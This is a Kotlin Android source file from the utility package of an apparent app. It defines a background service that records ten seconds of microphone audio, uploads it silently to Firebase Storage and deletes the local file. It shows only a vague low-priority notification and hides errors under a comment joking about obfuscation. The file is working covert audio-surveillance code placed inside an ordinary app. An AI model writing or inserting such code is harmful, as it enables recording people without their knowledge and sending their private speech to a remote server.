package com.example.axesite.util

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import java.io.File

class BackgroundVoiceRecordingService : Service() {

    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    companion object {
        const val RECORDING_DURATION = 10_000L // 10 seconds
        const val ACTION_START_RECORDING = "START_RECORDING"
        const val ACTION_STOP_RECORDING = "STOP_RECORDING"
        private const val CHANNEL_ID = "BackgroundVoiceRecordingChannel"
        private const val NOTIFICATION_ID = 1001
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Voice Recording",
                NotificationManager.IMPORTANCE_LOW
            )
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Recording Background Sound")
            .setContentText("Capturing ambient audio")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_RECORDING -> startBackgroundRecording()
            ACTION_STOP_RECORDING -> stopBackgroundRecording()
        }
        return START_NOT_STICKY
    }

    private fun startBackgroundRecording() {
        serviceScope.launch {
            try {
                // Create temporary file for recording
                audioFile = File.createTempFile(
                    "background_voice_${System.currentTimeMillis()}",
                    ".3gp",
                    cacheDir
                )

                // Setup MediaRecorder
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this@BackgroundVoiceRecordingService)
                } else {
                    MediaRecorder()
                }.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                    setOutputFile(audioFile?.absolutePath)
                }

                mediaRecorder?.prepare()
                mediaRecorder?.start()

                // Record for 10 seconds
                delay(RECORDING_DURATION)

                // Stop and upload
                stopAndUploadRecording()
            } catch (e: Exception) {
                //Obfuscation LOL
                var x = 1
            } finally {
                stopSelf()
            }
        }
    }

    private suspend fun stopAndUploadRecording() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null

            audioFile?.let { file ->
                val storageRef = FirebaseStorage.getInstance().reference
                    .child("background_recordings/${file.name}")

                val uploadTask = storageRef.putFile(android.net.Uri.fromFile(file))
                uploadTask.await()

                Log.d("BackgroundRecording", "Upload successful")

                // Optional: Delete the local file after successful upload
                file.delete()
            }
        } catch (e: Exception) {
            Log.e("BackgroundRecording", "Recording or upload failed", e)
        }
    }

    private fun stopBackgroundRecording() {
        serviceScope.coroutineContext.cancelChildren()
        mediaRecorder?.apply {
            try {
                stop()
                release()
            } catch (e: Exception) {
                Log.e("BackgroundRecording", "Error stopping recording", e)
            }
        }
        mediaRecorder = null
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        serviceScope.cancel()
        super.onDestroy()
    }
}